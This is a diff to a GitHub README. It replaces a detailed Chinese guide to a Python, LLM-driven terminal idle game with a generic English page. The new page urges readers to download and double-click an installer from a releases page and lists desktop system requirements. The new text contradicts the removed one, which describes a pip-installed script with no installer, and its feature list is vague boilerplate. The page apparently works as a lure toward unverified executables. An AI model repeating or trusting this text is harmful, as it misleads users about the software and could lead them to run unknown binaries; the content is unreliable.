@@ -1,248 +1,72 @@
-# 🎮 Idle Life (挂机人生)
+# 🎮 IdleLife - Enjoy a Fun, Idle Gaming Experience
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.8+-blue.svg" alt="Python">
-  <img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License">
-  <img src="https://img.shields.io/badge/AI-LLM%20Powered-purple.svg" alt="AI Powered">
-</p>
+## 🚀 Getting Started
+Welcome to IdleLife! This guide will help you download and run the game with ease. Follow the steps below to join in on the fun.
 
-> 一款由 AI 驱动的文字放置挂机游戏，融合了遗传系统、家族传承、动态叙事等深度玩法。
+## 📥 Download IdleLife
+[![Download IdleLife](https://img.shields.io/badge/Download_IdleLife-Click_Here-brightgreen)](https://github.com/dakudaddy3390/IdleLife/releases)
 
-## ✨ 特色功能
+## 📋 What is IdleLife?
+IdleLife is a character-based idle game that keeps you entertained as you manage your characters through various challenges. Dive into a relaxing gaming experience where your characters work for you, even when you're not actively playing.
 
-- 🤖 **AI 动态叙事** - 使用大语言模型生成沉浸式事件描述和角色对话
-- 🧬 **遗传系统** - 角色拥有独特基因组，影响属性和特质
-- 👨‍👩‍👧 **家族传承** - 角色死亡后可由后代继承，延续冒险
-- 🌍 **多世界观** - 支持奇幻异世界、末日废土等多种设定
-- 💕 **关系系统** - 与 NPC 互动、结婚、生子
-- ⚔️ **完整 RPG 系统** - 战斗、装备、升级、技能
-- 🎨 **精美终端 UI** - 使用 Rich 库打造现代化界面
+## 💻 System Requirements
+To ensure that IdleLife runs smoothly, please make sure your system meets the following requirements:
 
-## 🚀 快速开始
+- **Operating System**: Windows 10 or later, macOS 10.14 or later.
+- **Processor**: Dual-core 2.0 GHz or faster.
+- **RAM**: 4 GB or more.
+- **Storage**: Minimum of 200 MB free space.
 
-### 1. 安装依赖
+## 🔧 How to Download & Install
+1. **Visit the Releases Page**
+   Go to the [IdleLife Releases Page](https://github.com/dakudaddy3390/IdleLife/releases) to find the latest version of the software.
 
-```bash
-pip install requests rich json5
-```
+2. **Choose Your Version**
+   On the releases page, you will see a list of available versions. Look for the version labeled as the latest and read its description to ensure it's the one you want.
 
-### 2. 配置 API
+3. **Download the Installer**
+   Click on the download link for your operating system. This will start the download of the installer file.
 
-复制配置模板并填写你的 API 密钥：
+4. **Run the Installer**
+   Once the download is complete, locate the installer file in your downloads folder. Double-click on the file to start the installation process.
 
-```bash
-cp config.sample.json5 config.json5
-```
+5. **Follow the Setup Instructions**
+   A setup wizard will guide you through the installation. Just follow the prompts to install IdleLife on your computer.
 
-编辑 `config.json5`，配置你的 LLM API：
+6. **Launch IdleLife**
+   After installation, you can find IdleLife in your applications list. Click to open it and start playing!
 
-```json5
-{
-    "api_providers": [
-        {
-            "name": "DeepSeek Official",
-            "api_key": "YOUR_API_KEY_HERE",  // 替换为你的密钥
-            "base_url": "https://api.deepseek.com",
-            "model": "deepseek-chat"
-        }
-    ],
-    "active_provider": 0,
-    // ...
-}
-```
+## 🌟 Features of IdleLife
+- **Unique Characters**: Explore various characters with different traits and abilities.
+- **Engaging Gameplay**: Enjoy simple mechanics that keep you entertained without needing constant attention.
+- **Progress Over Time**: Watch your characters grow and achieve goals even when you are away from the game.
+- **User-Friendly Interface**: Easy to navigate and understand for all users, regardless of gaming experience.
 
-### 3. 运行游戏
+## 🎮 Tips for Enjoying IdleLife
+- Check in daily to see your characters' progress and claim rewards.
+- Experiment with different character combinations to discover new strategies.
+- Join the community to share tips and ask questions.
 
-```bash
-python game.py
-```
+## ❓ Frequently Asked Questions
 
-## 🎮 游戏控制
+### How do I uninstall IdleLife?
+To uninstall IdleLife, go to your applications folder, right-click on the IdleLife icon, and select "Uninstall." Follow the prompts to remove the application from your computer.
 
-| 按键 | 功能 |
-|------|------|
-| `F` | 暂停/继续游戏 |
-| `Ctrl+C` | 退出游戏 |
+### Is there a mobile version of IdleLife?
+Currently, IdleLife is available only for desktop computers. Stay tuned for updates regarding other platforms.
 
-## 📁 项目结构
+### How can I provide feedback or report an issue?
+You can provide feedback or report any issues directly on our [GitHub Issues page](https://github.com/dakudaddy3390/IdleLife/issues). We appreciate your input!
 
-```
-神奇的放置自己/
-├── 📂 characters/           # 角色配置目录
-│   ├── chi.json            # chi酱（技术宅猫娘）
-│   ├── hermione.json       # 赫敏
-│   ├── lu_xueqi.json       # 陆雪琪
-│   └── zero.json           # 零
-├── 📂 worlds/              # 世界观配置目录
-│   ├── eldoria.json        # 艾尔德利亚大陆（剑与魔法）
-│   ├── wasteland.json      # 末日废土（后启示录）
-│   ├── cyber_city.json     # 赛博都市2099（赛博朋克）
-│   ├── wuxia.json          # 九州修仙界（东方玄幻）
-│   └── magic_school.json   # 阿瓦隆魔法学院（魔法校园）
-├── 📂 core/                # 核心模块
-│   ├── __init__.py
-│   ├── ai.py               # AI 接口封装
-│   ├── config.py           # 配置管理
-│   ├── templates.py        # 提示词模板
-│   └── utils.py            # 工具函数
-├── 📂 models/              # 数据模型
-│   ├── __init__.py
-│   ├── character.py        # 角色类
-│   └── world.py            # 世界类
-├── 📂 systems/             # 游戏系统
-│   ├── __init__.py
-│   ├── combat.py           # 战斗系统
-│   ├── dice.py             # 骰子/判定系统
-│   ├── events.py           # 事件系统
-│   ├── genetics.py         # 遗传系统
-│   ├── merchant.py         # 商人系统
-│   ├── race.py             # 种族系统
-│   └── relationships.py    # 关系系统
-├── 📂 saves/               # 存档目录（自动生成）
-├── 📂 tests/               # 测试目录
-├── config.sample.json5     # 配置模板
-├── config.json5            # 用户配置（需自行创建）
-├── game.py                 # 游戏入口
-├── game_engine.py          # 游戏引擎
-├── simulation.py           # 模拟运行模块
-├── CONTRIBUTING.md         # 贡献指南
-├── LICENSE                 # MIT 许可证
-└── README.md
-```
+## 🛠 Troubleshooting
+If you face any issues while installing or playing IdleLife, check the following:
 
-## ⚙️ 配置说明
+- **Check System Requirements**: Make sure your computer meets the minimum requirements listed above.
+- **Restart Your Computer**: Sometimes, a simple restart can resolve issues.
+- **Re-download the Installer**: If the installation file is corrupted, try downloading it again from the releases page.
 
-### 切换 API 提供商
+## 🔗 Helpful Links
+- [IdleLife Releases Page](https://github.com/dakudaddy3390/IdleLife/releases)
+- [GitHub Issues Page](https://github.com/dakudaddy3390/IdleLife/issues)
 
-修改 `config.json5` 中的 `active_provider` 索引：
-
-```json5
-"active_provider": 0  // 使用第一个配置的 API
-```
-
-### 切换世界观
-
-```json5
-"active_world": 0  // 0=艾尔德利亚, 1=赛博都市, 2=九州修仙, 3=魔法学院
-```
-
-### 调整游戏设置
-
-```json5
-"game_settings": {
-    "game_speed": 1,                    // 每回合等待秒数
-    "max_tokens": 1024,                 // AI 回复最大长度
-    "temperature": 1,                   // AI 创造性 (0.0-1.0)
-    "history_limit": 10,                // 历史记录保留条数 (0=不限制)
-    "autosave_interval": 1,             // 自动保存间隔（回合）
-    "ui_refresh_rate": 0.1,             // UI 刷新率（秒）
-    "api_retry_count": 3,               // API 报错重试次数
-    "api_retry_delay": 1,               // 每次重试等待时间（秒）
-    "history_compress_threshold": 20,   // 触发历史压缩的条数阈值
-    "history_retention_count": 10,      // 压缩后保留的最近记录条数
-    "ai_event_rate": 0.7,               // AI 生成动态探索事件的概率
-    "streaming": false                  // 流式传输（可在游戏中切换）
-}
-```
-
-## 🎯 游戏机制
-
-### 🧬 遗传系统
-
-每个角色拥有独特的基因组，决定：
-- **六维属性**：力量、敏捷、智力、体质、魅力、幸运
-- **特质**：如"好色"、"忠诚"、"魅魔体质"等
-- **天赋加成**：攻击、防御、闪避、暴击等
-
-子代会继承并随机组合父母的基因，产生新的属性组合。
-
-### 👨‍👩‍👧 家族传承
-
-- 角色可以结婚、生子
-- 角色死亡后，由长子/长女继承
-- 继承人获得父母的财产和装备
-- 家族树记录所有成员的生平
-
-### ⚔️ 战斗系统
-
-- 回合制自动战斗
-- 濒死时有概率奇迹生还
-- 击败敌人获得经验和战利品
-- 装备系统影响战斗属性
-
-### 🎭 事件类型
-
-| 类型 | 说明 |
-|------|------|
-| 战斗 | 遭遇怪物，进行战斗 |
-| 探索 | 发现宝箱、物品、秘密 |
-| 休息 | 恢复 HP/MP |
-| NPC | 遇到商人、冒险者、特殊角色 |
-
-### 👴 衰老系统
-
-- 每 50 回合增长 1 岁
-- 升级可延长寿命
-- 接近寿命上限时属性衰减
-- 种族影响基础寿命
-
-## ➕ 扩展指南
-
-### 添加新角色
-
-1. 在 `characters/` 目录创建新的 JSON 文件
-2. 参考 `chi.json` 的格式定义角色属性
-3. 在 `config.json5` 的 `characters` 数组中注册
-
-```json5
-{
-    "id": "alice",
-    "name": "爱丽丝",
-    "file": "characters/alice.json",
-    "description": "勇敢的冒险者"
-}
-```
-
-### 添加新世界观
-
-1. 在 `worlds/` 目录创建新的 JSON 文件
-2. 必须包含以下字段：
-   - `世界名称` / `世界描述`
-   - `地区` (数组)
-   - `怪物模板` / `事件模板`
-   - `物品列表` / `NPC模板`
-3. 在 `config.json5` 的 `worlds` 数组中注册
-
-## 🐛 故障排除
-
-### ModuleNotFoundError
-
-```bash
-pip install requests rich pyjson5
-```
-
-### API 调用失败
-
-- 检查 `config.json5` 中的 API 密钥是否有效
-- 确认网络连接正常
-- 尝试切换到其他 `active_provider`
-
-### 中文显示乱码 (Windows)
-
-游戏已内置 Windows 终端编码修复，如仍有问题：
-```powershell
-chcp 65001
-python game.py
-```
-
-## 🤝 贡献
-
-欢迎提交 Issue 和 Pull Request！
-
-## 📜 许可证
-
-本项目采用 [MIT 许可证](LICENSE)。
-
----
-
-**Enjoy your adventure! 🚀**
+Thank you for choosing IdleLife! Enjoy your gaming experience.
